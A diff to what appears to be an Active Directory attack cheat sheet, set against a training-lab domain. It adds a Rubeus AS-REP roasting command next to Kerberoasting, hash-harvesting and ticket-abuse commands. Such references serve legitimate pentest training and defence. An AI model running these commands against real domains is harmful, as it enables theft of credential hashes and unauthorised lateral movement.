@@ -3,6 +3,7 @@
 | `Invoke-Kerberoast`  | Get Kerberoastable accounts & hashes on Windows  |
 | `GetUserSPNs.py inlanefreight.local/pixis`  | Get Kerberoastable accounts & hashes on Linux |
 | `Get-DomainUser -UACFilter DONT_REQ_PREAUTH`  | Get AS-Rep roastable accounts & hashes on Windows |
+| `Rubeus.exe asreproast /format:hashcat` | Get AS-Rep roastable accounts & hashes with rubeus |
 | `GetNPUsers.py inlanefreight.local/pixis`  | Get AS-Rep roastable accounts & hashes on Linux |
 | `Rubeus.exe monitor /interval:5`  | Monitor TGT copies in TGS every 5 secondes (Unconstrained Delegation) |
 | `Rubeus.exe asktgs /ticket:<b64 ticket> /service:<SPN> /ptt`  | Get a TGS using a TGT |
